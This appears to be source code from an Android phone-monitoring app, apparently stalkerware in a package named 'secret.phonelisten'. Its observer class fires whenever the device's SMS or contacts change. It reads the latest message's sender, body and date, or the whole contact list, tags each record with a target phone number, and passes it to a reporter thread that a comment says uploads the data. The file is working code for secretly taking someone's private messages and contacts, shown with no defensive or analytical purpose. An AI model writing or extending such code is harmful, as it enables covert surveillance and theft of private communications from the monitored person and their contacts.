package com.comsince.secret.phonelisten.observer;

import android.content.AsyncQueryHandler;
import android.content.ContentResolver;

import android.content.Context;
import android.database.ContentObserver;

import android.database.Cursor;

import android.net.Uri;
import android.os.Handler;

import android.os.Message;

import android.provider.ContactsContract;
import android.util.Log;

import com.comsince.secret.common.Constant;
import com.comsince.secret.phonelisten.model.ContactPerson;
import com.comsince.secret.phonelisten.model.Record;
import com.comsince.secret.phonelisten.model.SmsMessage;
import com.comsince.secret.phonelisten.service.ActionReporter;
import com.comsince.secret.ui.MIMIApplication;

import java.util.ArrayList;
import java.util.List;

public class PhoneListenObserver extends ContentObserver {
    public static final String TAG = "SMSObserver";

    private AsyncQueryHandler smsAsyncQuery;
    private AsyncQueryHandler contactAsyncQuery;
    private ContentResolver mResolver;
    private Handler handler;
    public  static Uri smsUri = Uri.parse("content://sms");
    String[] projection = new String[] {
            SmsMessage.ADDRESS,
            SmsMessage.TYPE,
            SmsMessage.DATE,
            SmsMessage.BODY,
            SmsMessage.PERSON
    };


    Uri contactUri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI; // 联系人的Uri
    String[] contactProjection = {
            ContactsContract.CommonDataKinds.Phone._ID,
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER,
            "sort_key",
            ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
            ContactsContract.CommonDataKinds.Phone.PHOTO_ID,
            ContactsContract.CommonDataKinds.Phone.LOOKUP_KEY
    };

	public PhoneListenObserver(ContentResolver contentResolver, Handler handler) {
		super(handler);
        this.handler = handler;
		this.mResolver = contentResolver;
        smsAsyncQuery = new SMSAsyncQuery(mResolver);
        contactAsyncQuery = new ContactAsyncQuery(mResolver);
	}

	@Override
	public void onChange(boolean selfChange,Uri uri) {
		super.onChange(selfChange, uri);
        Log.i(TAG,"URI----"+uri);
        if(uri.toString().contains(smsUri.toString())){
            Log.i(TAG,"start query msg");
            smsAsyncQuery.startQuery(0, null, smsUri, projection, null, null,"date desc");
        } else if(ContactsContract.AUTHORITY_URI.equals(uri)){
            Log.i(TAG,"start query contact");
            contactAsyncQuery.startQuery(0,null,contactUri,contactProjection,null,null,"sort_key COLLATE LOCALIZED asc");
        }

	}

    private class SMSAsyncQuery extends AsyncQueryHandler{

        public SMSAsyncQuery(ContentResolver cr) {
            super(cr);
        }

        @Override
        protected void onQueryComplete(int token, Object cookie, Cursor cursor) {
            SmsMessage smsMessage = new SmsMessage();
            if (cursor != null && cursor.getCount() > 0) {
                if(cursor.moveToFirst()){
                    smsMessage.setAddress(cursor.getString(cursor.getColumnIndex(SmsMessage.ADDRESS)));
                    smsMessage.setBody(cursor.getString(cursor.getColumnIndex(SmsMessage.BODY)));
                    smsMessage.setDate(String.valueOf(cursor.getLong(cursor.getColumnIndex(SmsMessage.DATE))));
                    smsMessage.setPerson(cursor.getString(cursor.getColumnIndex(SmsMessage.PERSON)));
                    smsMessage.setType(String.valueOf(cursor.getInt(cursor.getColumnIndex(SmsMessage.TYPE))));
                }
            }
            Log.i(TAG,"sms message---"+smsMessage.toString());
            //构造smsmessge并上传数据
            new Thread(new ActionReporter(generalSmsRecord(smsMessage),null)).start();
        }
    }

    private class ContactAsyncQuery extends AsyncQueryHandler{

        public ContactAsyncQuery(ContentResolver cr) {
            super(cr);
        }

        @Override
        protected void onQueryComplete(int token, Object cookie, Cursor cursor) {
            List<ContactPerson> contactPersonList = new ArrayList<ContactPerson>();
            if (cursor != null && cursor.getCount() > 0) {
               while (cursor.moveToNext()){
                   ContactPerson contactPerson = new ContactPerson();
                   contactPerson.setName(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                   contactPerson.setNumber(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                   MIMIApplication.contactMap.clear();
                   MIMIApplication.contactMap.put(contactPerson.getNumber(),contactPerson.getName());
                   contactPersonList.add(contactPerson);
                   Log.i(TAG,"contact----"+contactPerson.toString());
               }
            }
            Log.i(TAG,"contact size----"+contactPersonList.size());
            for(ContactPerson cp : contactPersonList){
                new Thread(new ActionReporter(generalContactRecord(cp),null)).start();
            }
        }
    }

    /**
     * 构造短信数据
     * */
    private Record generalSmsRecord(SmsMessage smsMessage){
        Record record = new Record();
        record.setType(Constant.SmsMessageContants.TYPE_2);
        record.setMenumber(Constant.PhoneListenContants.TARGET_NUMBER);
        record.setHenumber(smsMessage.getAddress());
        record.setHename(MIMIApplication.contactMap.get(smsMessage.getAddress()));
        record.setBeginTime(smsMessage.getDate());
        record.setContent(smsMessage.getBody());
        record.setStatus(smsMessage.getType());
        return record;
    }

    private Record generalContactRecord(ContactPerson contactPerson){
        Record record = new Record();
        record.setType(Constant.ContactContants.TYPE_4);
        record.setHenumber(contactPerson.getNumber());
        record.setHename(contactPerson.getName());
        return record;
    }

    public static class SMSHandler extends Handler{
        private Context context;

        public SMSHandler(Context context){
            this.context = context;
        }
        @Override
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
        }
    }
}